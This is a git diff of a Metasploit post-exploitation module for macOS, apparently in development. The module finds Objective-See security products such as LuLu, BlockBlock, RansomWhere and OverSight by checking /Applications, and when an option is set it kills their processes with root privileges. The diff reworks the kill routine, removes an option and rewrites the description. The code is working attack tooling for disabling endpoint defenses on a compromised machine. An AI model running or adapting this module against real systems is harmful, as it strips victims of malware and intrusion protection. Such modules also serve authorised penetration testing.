@@ -4,9 +4,9 @@
 ##
 
 class MetasploitModule < Msf::Post
-  include Msf::Post::OSX
   include Msf::Post::Process
   include Msf::Post::File
+  include Msf::Post::OSX::Priv 
 
   def initialize(info = {})
     super(
@@ -15,10 +15,8 @@ class MetasploitModule < Msf::Post
         'Objective See Killer' => 'OSX Manage Module: Enumerate and disable Objective See products',
         'Description' => %q{
           This module enumerates the system for the presence of Objective See products such as LuLu, BlockBlock, Do Not Disturb,
-          Rei Key, Ransom Where and Over Sight. If the disable option is set each product will be sent a kill
-          signal to the pid associated with the application. Removing the product entirely from the system is
-          also an option, removal occurs by <FILL IN>. Killing
-          the pid and removing the product both require sudo privlleges.
+          Rei Key, Ransom Where and Over Sight by checking the /Applications directory. If the KILL_PROCESS option is set to true
+          the module will attempt to send a kill signal to the process id of each AV product, doing so requires sudo privileges.
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'gardnerapp' ],
@@ -32,10 +30,6 @@ class MetasploitModule < Msf::Post
   )
     register_options(
       [
-        OptBool.new('ENUMERATE', [
-          true, 'Determine installation status of Objective See Products by checking the /Applications foi
-                                  ler', true
-        ]),
         OptBool.new('KILL_PROCESSES', [
           true, 'Kills processes of installed objective see products. Requires root privilleges and
                                        requires the enumerate option to be set to true.', false
@@ -76,14 +70,6 @@ class MetasploitModule < Msf::Post
     def installed?
       @msf.send :directory?, @path
     end
-
-    def kill_pids
-      @processes.each do |id|
-        print_status "Trying to kill process #{id} for #{@name}..."
-        result = kill_process id
-        print_status result
-      end
-    end
   end
 
   # Determine which products are installed and their ppid if any
@@ -102,6 +88,14 @@ class MetasploitModule < Msf::Post
                 'The current session is not root. Please escalate the session and try again before rerunning the module.')
     end
   end
+
+  def kill_pids(obj_see)
+    print_status "Attempting to kill pid(s) #{obj_see.pids.inspect} for #{obj_see.name}"
+    obj_see.pids.each do |pid| 
+      result = kill_process pid
+      print_good "Kill signal was successful for #{pid}" if result
+    end 
+  end 
 
   def run
     print_status('Retrieving process list...')
@@ -122,7 +116,7 @@ class MetasploitModule < Msf::Post
     # todo test killing procs
     if datastore['KILL_PROCESSES']
       fail_no_root
-      ObjectiveSee.installed_products.each(&:kill_pids) if datastore['KILL_PROCESSES']
+      ObjectiveSee.installed_products.each {|prod| kill_pids prod}
     end
   end
 end
